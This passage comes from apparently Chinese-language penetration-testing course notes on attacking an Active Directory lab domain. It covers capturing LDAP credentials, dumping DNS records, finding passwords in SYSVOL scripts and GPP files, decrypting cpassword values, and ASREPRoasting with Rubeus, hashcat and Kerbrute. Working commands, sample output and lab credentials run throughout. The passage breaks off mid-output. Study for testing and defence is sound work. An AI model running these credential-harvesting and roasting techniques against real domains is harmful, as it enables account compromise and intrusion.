管理控制台中，以连接到域。这些控制台通常留有弱密码或默认密码。有时，这些凭据可以以明文形式查看。其他时候，应用程序有一个<code>test connection</code>功能，可以通过将 LDAP IP 地址更改为攻击主机的 IP 地址并<code>netcat</code>在 LDAP 端口 389 上设置侦听器来收集凭据。当设备尝试测试 LDAP 连接时，它会将凭据发送到机器，通常以明文形式。用于 LDAP 连接的帐户通常具有特权，但如果不是，这可以作为域中的初始立足点。其他时候，需要完整的 LDAP 服务器才能完成此攻击，如<a href="https://grimhacker.com/2018/03/09/just-a-printer/">本文所述</a>。</p><h2 id="Enumerating-DNS-Records"><a href="#Enumerating-DNS-Records" class="headerlink" title="Enumerating DNS Records"></a>Enumerating DNS Records</h2><p>可以使用<a href="https://github.com/dirkjanm/adidnsdump">adidnsdump</a>等工具，通过有效的域用户帐户枚举域中的所有 DNS 记录。如果使用诸如<code>BloodHound</code>之类的工具枚举时返回给主机命名约定类似于<code>SRV01934.INLANEFREIGHT.LOCAL</code>，这将特别有用。如果所有服务器和工作站都有一个非描述性名称，就很难知道到底要攻击什么。如果可以访问 AD 中的 DNS 条目，可能会发现指向同一服务器的有趣 DNS 记录，例如<code>JENKINS.INLANEFREIGHT.LOCAL</code>，可以使用它来更好地计划攻击。</p><p>该工具之所以有效，是因为默认情况下，所有用户都可以在 AD 环境中列出 DNS 区域的子对象。默认情况下，使用 LDAP 查询 DNS 记录不会返回所有结果。因此，通过使用<code>adidnsdump</code>工具，可以解析区域中的所有记录，并可能找到对参与有用的东西。有关此工具和技术的背景和更深入的解释可以在这篇<a href="https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/">文章</a>中找到。</p><p>第一次运行该工具时，可以看到一些记录是空白的，即<code>?,LOGISTICS,?</code>。</p><h3 id="adidnsdump"><a href="#adidnsdump" class="headerlink" title="adidnsdump"></a>adidnsdump</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 </span><br><span class="line"></span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line">[-] Connecting to host...</span><br><span class="line">[-] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[-] Querying zone for records</span><br><span class="line">[+] Found 27 records</span><br></pre></td></tr></table></figure><p>records.csv</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ head records.csv </span><br><span class="line"></span><br><span class="line">type,name,value</span><br><span class="line">?,LOGISTICS,?</span><br><span class="line">AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691</span><br><span class="line">AAAA,ForestDnsZones,dead:beef::231</span><br><span class="line">A,ForestDnsZones,10.129.202.29</span><br><span class="line">A,ForestDnsZones,172.16.5.240</span><br><span class="line">A,ForestDnsZones,172.16.5.5</span><br><span class="line">AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691</span><br><span class="line">AAAA,DomainDnsZones,dead:beef::231</span><br><span class="line">A,DomainDnsZones,10.129.202.29</span><br></pre></td></tr></table></figure><p>如果再次使用<code>-r</code>参数运行，该工具将尝试通过执行<code>A</code>查询来解析未知记录。现在可以看到LOGISTICS 的 IP 地址为<code>172.16.5.240</code>。虽然这是一个小例子，但值得在更大的环境中运行此工具。可能会发现“隐藏”的记录，从而发现有趣的主机。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r</span><br><span class="line"></span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line">[-] Connecting to host...</span><br><span class="line">[-] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[-] Querying zone for records</span><br><span class="line">[+] Found 27 records</span><br></pre></td></tr></table></figure><p>records.csv</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ head records.csv </span><br><span class="line"></span><br><span class="line">type,name,value</span><br><span class="line">A,LOGISTICS,172.16.5.240</span><br><span class="line">AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691</span><br><span class="line">AAAA,ForestDnsZones,dead:beef::231</span><br><span class="line">A,ForestDnsZones,10.129.202.29</span><br><span class="line">A,ForestDnsZones,172.16.5.240</span><br><span class="line">A,ForestDnsZones,172.16.5.5</span><br><span class="line">AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691</span><br><span class="line">AAAA,DomainDnsZones,dead:beef::231</span><br><span class="line">A,DomainDnsZones,10.129.202.29</span><br></pre></td></tr></table></figure><h2 id="Password-in-Description-Field"><a href="#Password-in-Description-Field" class="headerlink" title="Password in Description Field"></a>Password in Description Field</h2><p>敏感信息（例如帐户密码）有时会出现在用户帐户<code>Description</code>或<code>Notes</code>字段中，可以使用 PowerView 快速枚举。对于大型域，将这些数据导出到 CSV 文件以供离线查看会很有帮助。</p><p>使用 Get-Domain User 在描述字段中查找密码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> * | <span class="built_in">Select-Object</span> samaccountname,description |<span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.Description <span class="operator">-ne</span> <span class="variable">$null</span>&#125;</span><br><span class="line"></span><br><span class="line">samaccountname description</span><br><span class="line"><span class="literal">--------------</span> <span class="literal">-----------</span></span><br><span class="line">administrator  Built<span class="operator">-in</span> account <span class="keyword">for</span> administering the computer/domain</span><br><span class="line">guest          Built<span class="operator">-in</span> account <span class="keyword">for</span> guest access to the computer/domain</span><br><span class="line">krbtgt         Key Distribution Center Service Account</span><br><span class="line">ldap.agent     *** <span class="keyword">DO</span> NOT CHANGE ***  <span class="number">3</span>/<span class="number">12</span>/<span class="number">2012</span>: Sunsh1ne4All!</span><br></pre></td></tr></table></figure><h2 id="PASSWD-NOTREQD-Field"><a href="#PASSWD-NOTREQD-Field" class="headerlink" title="PASSWD_NOTREQD Field"></a>PASSWD_NOTREQD Field</h2><p>可能会遇到在 userAccountControl 属性中设置了<a href="https://ldapwiki.com/wiki/Wiki.jsp?page=PASSWD_NOTREQD">passwd_notreqd</a>字段的域帐户。如果设置了该字段，则用户不受当前密码策略长度的限制，这意味着他们可以使用较短的密码或根本不使用密码（如果域中允许使用空密码）。密码可能被故意设置为空白（有时管理员不想在非工作时间被叫去重置用户密码）或在通过命令行更改密码时意外按下 Enter 键。仅仅因为在帐户上设置了此标志，并不意味着没有设置密码，只是可能不需要密码。在用户帐户上设置此标志的原因有很多，其中一个原因是供应商产品在安装时在某些帐户上设置了此标志，并且在安装后从未删除该标志。值得枚举设置了此标志的帐户并测试每个帐户以查看是否不需要密码（我在评估中见过几次这种情况）。此外，如果评估的目标是尽可能全面，请将其包含在客户报告中。</p><p>检查PASSWD_NOTREQD设置</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-UACFilter</span> PASSWD_NOTREQD | <span class="built_in">Select-Object</span> samaccountname,useraccountcontrol</span><br><span class="line"></span><br><span class="line">samaccountname                                                         useraccountcontrol</span><br><span class="line"><span class="literal">--------------</span>                                                         <span class="literal">------------------</span></span><br><span class="line">guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD</span><br><span class="line">mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD</span><br><span class="line">ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD</span><br><span class="line"><span class="variable">$725000</span><span class="literal">-9jb50uejje9f</span>                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT</span><br><span class="line">nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT</span><br></pre></td></tr></table></figure><h2 id="Credentials-in-SMB-Shares-and-SYSVOL-Scripts"><a href="#Credentials-in-SMB-Shares-and-SYSVOL-Scripts" class="headerlink" title="Credentials in SMB Shares and SYSVOL Scripts"></a>Credentials in SMB Shares and SYSVOL Scripts</h2><p>SYSVOL 共享可能是一个数据宝库，尤其是在大型组织中。可能会在脚本目录中找到许多不同的批处理、VBScript 和 PowerShell 脚本，这些脚本可供域中所有经过身份验证的用户读取。值得深入研究此目录以寻找存储在脚本中的密码。有时会发现包含已禁用帐户或旧密码的非常古老的脚本，但有时会发现金矿，所以应该始终深入研究此目录。在这里，可以看到一个名为的有趣脚本<code>reset_local_admin_pass.vbs</code>。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">ls</span> \\academy<span class="literal">-ea-dc01</span>\SYSVOL\INLANEFREIGHT.LOCAL\scripts</span><br><span class="line"></span><br><span class="line">    Directory: \\academy<span class="literal">-ea-dc01</span>\SYSVOL\INLANEFREIGHT.LOCAL\scripts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                 </span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                                                                 </span><br><span class="line"><span class="literal">-a----</span>       <span class="number">11</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">10</span>:<span class="number">44</span> AM            <span class="number">174</span> daily<span class="literal">-runs</span>.zip                                                       </span><br><span class="line"><span class="literal">-a----</span>        <span class="number">2</span>/<span class="number">28</span>/<span class="number">2022</span>   <span class="number">9</span>:<span class="number">11</span> PM            <span class="number">203</span> <span class="built_in">disable-nbtns</span>.ps1                                                    </span><br><span class="line"><span class="literal">-a----</span>         <span class="number">3</span>/<span class="number">7</span>/<span class="number">2022</span>   <span class="number">9</span>:<span class="number">41</span> AM         <span class="number">144138</span> Logon Banner.htm                                                     </span><br><span class="line"><span class="literal">-a----</span>         <span class="number">3</span>/<span class="number">8</span>/<span class="number">2022</span>   <span class="number">2</span>:<span class="number">56</span> PM            <span class="number">979</span> reset_local_admin_pass.vbs  </span><br></pre></td></tr></table></figure><p>仔细查看该脚本，发现它包含 Windows 主机上内置本地管理员的密码。在这种情况下，值得检查一下域中的任何主机上是否仍设置了此密码。可以使用 <code>CrackMapExec</code> 和<code>--local-auth</code> 标志来执行此操作，如本模块的内部<code>Internal Password Spraying - from Linux</code>。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">cat</span> \\academy<span class="literal">-ea-dc01</span>\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs</span><br><span class="line"></span><br><span class="line">On Error Resume Next</span><br><span class="line">strComputer = <span class="string">&quot;.&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">Set</span> oShell = CreateObject(<span class="string">&quot;WScript.Shell&quot;</span>) </span><br><span class="line">sUser = <span class="string">&quot;Administrator&quot;</span></span><br><span class="line">sPwd = <span class="string">&quot;!ILFREIGHT_L0cALADmin!&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">Set</span> Arg = WScript.Arguments</span><br><span class="line"><span class="keyword">If</span>  Arg.Count &gt; <span class="number">0</span> Then</span><br><span class="line">sPwd = Arg(<span class="number">0</span>) <span class="string">&#x27;Pass the password as parameter to the script</span></span><br><span class="line"><span class="string">End if</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&#x27;</span>Get the administrator name</span><br><span class="line"><span class="built_in">Set</span> objWMIService = GetObject(<span class="string">&quot;winmgmts:\\&quot;</span> &amp; strComputer &amp; <span class="string">&quot;\root\cimv2&quot;</span>)</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h2 id="Group-Policy-Preferences-GPP-Passwords"><a href="#Group-Policy-Preferences-GPP-Passwords" class="headerlink" title="Group Policy Preferences (GPP) Passwords"></a>Group Policy Preferences (GPP) Passwords</h2><p>创建新的 GPP 时，会在 SYSVOL 共享中创建一个 .xml 文件，该文件也会在组策略适用的端点上本地缓存。这些文件可以包括用于以下操作的文件：</p><ul><li>映射驱动器 (drives.xml)</li><li>创建本地用户</li><li>创建打印机配置文件（printers.xml）</li><li>创建和更新服务（services.xml）</li><li>创建计划任务（scheduledtasks.xml）</li><li>更改本地管理员密码。</li></ul><p>这些文件可以包含一系列配置数据和定义的密码。<code>cpassword</code>属性值是 AES-256 位加密的，但 Microsoft<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">在 MSDN 上发布了 AES 私钥</a>，可用于解密密码。任何域用户都可以读取这些文件，因为它们存储在 SYSVOL 共享上，并且域中所有经过身份验证的用户默认都具有对此域控制器共享的读取权限。</p><p><a href="https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30">2014 年MS14-025 GPP 中的漏洞可能允许特权提升</a>，已修复此问题，以防止管理员使用 GPP 设置密码。此修补程序不会从 SYSVOL 中删除带有密码的现有 Groups.xml 文件。如果您删除 GPP 策略而不是将其与 OU 取消链接，则本地计算机上的缓存副本将保留。</p><p>XML 如下所示：</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729257504062.png" alt="图像"></p><p>如果您更手动地检索 cpassword 值，<code>gpp-decrypt</code>则可以使用该实用程序按如下方式解密密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE</span><br><span class="line"></span><br><span class="line">Password1</span><br></pre></td></tr></table></figure><p>可以通过搜索或手动浏览 SYSVOL 共享或使用<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">Get-GPPPassword.ps1</a>、GPP Metasploit Post Module 和其他 Python&#x2F;Ruby 脚本等工具来定位 GPP 密码，这些脚本将定位 GPP 并返回解密的 cpassword 值。CrackMapExec 还有两个用于定位和检索 GPP 密码的模块。在交战期间要考虑的一个快速提示：通常，GPP 密码是为旧帐户定义的，因此您可以检索和解密已锁定或已删除帐户的密码。但是，值得尝试使用此密码在内部进行密码喷洒（特别是如果它是唯一的）。密码重用很普遍，GPP 密码与密码喷洒相结合可能会导致进一步的访问。</p><h3 id="Locating-Retrieving-GPP-Passwords-CrackMapExec"><a href="#Locating-Retrieving-GPP-Passwords-CrackMapExec" class="headerlink" title="Locating &amp; Retrieving GPP Passwords - CrackMapExec"></a>Locating &amp; Retrieving GPP Passwords - CrackMapExec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb -L | grep gpp</span><br><span class="line"></span><br><span class="line">[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.</span><br><span class="line">[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.</span><br></pre></td></tr></table></figure><p>当通过组策略配置自动登录时，还可以在 Registry.xml 等文件中找到密码。这可能出于多种原因而设置，以使计算机在启动时自动登录。如果这是通过组策略设置的，而不是在主机本地设置的，那么域中的任何人都可以检索为此目的创建的 Registry.xml 文件中存储的凭据。这是一个与 GPP 密码不同的问题，因为 Microsoft 尚未采取任何措施阻止以明文形式将这些凭据存储在 SYSVOL 上，因此域中任何经过身份验证的用户都可以读取这些凭据。可以使用带有<a href="https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-gpp_autologin">gpp_autologin</a>模块的 CrackMapExec 或使用PowerSploit 中包含的<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1">Get-GPPAutologon.ps1脚本来寻找它。</a></p><h3 id="CrackMapExec’s-gpp-autologin-Module"><a href="#CrackMapExec’s-gpp-autologin-Module" class="headerlink" title="CrackMapExec’s gpp_autologin Module"></a>CrackMapExec’s gpp_autologin Module</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 </span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share</span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml</span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/&#123;CAEBB51E-92FD-431D-8DBE-F9312DB5617D&#125;/Machine/Preferences/Registry/Registry.xml</span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/&#123;CAEBB51E-92FD-431D-8DBE-F9312DB5617D&#125;/Machine/Preferences/Registry/Registry.xml</span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: [&#x27;guarddesk&#x27;]</span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: [&#x27;INLANEFREIGHT.LOCAL&#x27;]</span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: [&#x27;ILFreightguardadmin!&#x27;]</span><br></pre></td></tr></table></figure><p>在上面的输出中，可以看到已检索到名为 的帐户的凭据<code>guarddesk</code>。这可能是为了让警卫使用的共享工作站在启动时自动登录，以适应白天和晚上轮班工作的多个用户。在这种情况下，凭据可能是本地管理员，因此值得找到可以以管理员身份登录并寻找其他数据的主机。有时可能会发现高权限用户的凭据或对无用的已禁用帐户&#x2F;过期密码的凭据。</p><p>在本模块中涉及的一个主题是密码重用。许多组织中密码卫生不良的情况很常见，因此每当获得凭据时，都应该检查是否可以使用它们访问其他主机（作为域或本地用户）、利用任何权限（例如有趣的 ACL）、访问共享，或者在密码喷洒攻击中使用密码来发现密码重用，或许是授予进一步访问权限以实现目标的帐户。</p><h2 id="ASREPRoasting"><a href="#ASREPRoasting" class="headerlink" title="ASREPRoasting"></a>ASREPRoasting</h2><p><a href="https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory">任何启用了“不需要 Kerberos 预身份验证”</a>设置的帐户都可以获取票证授予票证 (TGT) 。许多供应商安装指南都指定以这种方式配置其服务帐户。身份验证服务回复 (AS_REP) 使用帐户的密码加密，任何域用户都可以请求它。</p><p>使用预身份验证时，用户输入密码，该密码会加密时间戳。域控制器将解密该时间戳以验证是否使用了正确的密码。如果成功，将向用户发出 TGT 以在域中发出进一步的身份验证请求。如果帐户已禁用预身份验证，攻击者可以请求受影响帐户的身份验证数据并从域控制器检索加密的 TGT。这可以使用 Hashcat 或 John the Ripper 等工具进行离线密码攻击。</p><p>查看“不需要 Kerberos 预身份验证”选项查看帐户</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729068577400.png" alt="图像"></p><p>ASREPRoasting 与 Kerberoasting 类似，但它涉及攻击 AS-REP 而不是 TGS-REP。不需要 SPN。可以使用 PowerView 或内置工具（例如 PowerShell AD 模块）枚举此设置。</p><p>攻击本身可以使用<a href="https://github.com/GhostPack/Rubeus">Rubeus</a>工具包和其他工具来执行，以获取目标帐户的票证。如果攻击者拥有<code>GenericWrite</code>或<code>GenericAll</code>对帐户拥有权限，他们可以启用此属性并获取 AS-REP 票证以进行离线破解，以恢复帐户的密码，然后再禁用该属性。与 Kerberoasting 一样，此攻击的成功取决于帐户是否具有相对较弱的密码。</p><h3 id="PowerView-Get-DomainUser"><a href="#PowerView-Get-DomainUser" class="headerlink" title="PowerView Get-DomainUser"></a>PowerView Get-DomainUser</h3><p>PowerView 可用于枚举 UAC 值设置为 的用户<code>DONT_REQ_PREAUTH</code>。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-PreauthNotRequired</span> | <span class="built_in">select</span> samaccountname,userprincipalname,useraccountcontrol | <span class="built_in">fl</span></span><br><span class="line"></span><br><span class="line">samaccountname     : mmorgan</span><br><span class="line">userprincipalname  : mmorgan@inlanefreight.local</span><br><span class="line">useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH</span><br></pre></td></tr></table></figure><p>掌握这些信息后，可以利用 Rubeus 工具以正确的格式检索 AS-REP，以进行离线哈希破解。此攻击不需要任何域用户上下文，只需知道用户的 SAM 名称即可完成，无需 Kerberos 预授权。将在本节后面看到一个使用 Kerbrute 的示例。请记住，添加标志<code>/nowrap</code>，以便票证不是列包装的，并以可以轻松输入 Hashcat 的格式检索。</p><h3 id="Retrieve-AS-REP"><a href="#Retrieve-AS-REP" class="headerlink" title="Retrieve AS-REP"></a>Retrieve AS-REP</h3><h4 id="Rubeus-2"><a href="#Rubeus-2" class="headerlink" title="Rubeus"></a>Rubeus</h4><p>Rubeus 以正确的格式检索 AS-REP</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span></span><br><span class="line"></span><br><span class="line">[*] Action: AS<span class="literal">-REP</span> roasting</span><br><span class="line"></span><br><span class="line">[*] Target User            : mmorgan</span><br><span class="line">[*] Target Domain          : INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))&#x27;</span></span><br><span class="line">[*] SamAccountName         : mmorgan</span><br><span class="line">[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)</span><br><span class="line">[*] Building AS<span class="literal">-REQ</span> (w/o preauth) <span class="keyword">for</span>: <span class="string">&#x27;INLANEFREIGHT.LOCAL\mmorgan&#x27;</span></span><br><span class="line">[+] AS<span class="literal">-REQ</span> w/o preauth successful!</span><br><span class="line">[*] AS<span class="literal">-REP</span> hash:</span><br><span class="line">     <span class="variable">$krb5asrep</span><span class="variable">$23</span><span class="variable">$mmorgan</span>@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55<span class="variable">$0978822DEC13046712DB7DC03F6C4DE059A946485451AAE98BB93DFF8E3E64F3AA5614160F21A029C2B9437CB16E5E9DA4A2870FEC0596B09BADA989D1F8057262EA40840E8D0F20313B4E9A40FA5E4F987FF404313227A7BFFAE748E07201369D48ABB4727DFE1A9F09D50D7EE3AA5C13E4433E0F9217533EE0E74B02EB8907E13A208340728F794ED5103CB3E5C7915BF2F449AFDA41988FF48A356BF2BE680A25931A8746A99AD3E757BFE097B852F72CEAE1B74720C011CFF7EC94CBB6456982F14DA17213B3B27DFA1AD4C7B5C7120DB0D70763549E5144F1F5EE2AC71DDFC4DCA9D25D39737DC83B6BC60E0A0054FC0FD2B2B48B25C6CA</span></span><br></pre></td></tr></table></figure><p>然后，可以使用模式的 Hashcat 离线破解哈希<code>18200</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt </span><br></pre></td></tr></table></figure><h4 id="Kerbrute-2"><a href="#Kerbrute-2" class="headerlink" title="Kerbrute"></a>Kerbrute</h4><p>当使用<code>Kerbrute</code>执行用户枚举时，该工具将自动检索任何不需要 Kerberos 预身份验证的用户的 AS-REP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2022/04/01 13:14:17 &gt;  Using KDC(s):</span><br><span class="line">2022/04/01 13:14:17 &gt;  172.16.5.5:88</span><br><span class="line"></span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME: sbrown@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME: 